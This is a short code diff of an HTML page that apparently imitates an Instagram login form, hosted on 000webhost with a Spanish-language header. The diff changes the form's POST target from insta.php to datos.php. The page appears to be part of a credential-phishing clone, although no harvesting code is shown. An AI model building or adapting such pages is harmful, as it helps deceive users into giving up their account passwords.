@@ -48,7 +48,7 @@ img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000w
    	   		<div class="min-header">
    	   			<a href="#" class="idioma">Español<i class="icon-angle-down"></i></a>
    	   		</div>
-   	   		<form  class="form-insta" action="insta.php" method="post">
+   	   		<form  class="form-insta" action="datos.php" method="post">
                 <div class="content-logo">
    	   			   <img src="img/instagram.png">
    	   		    </div>
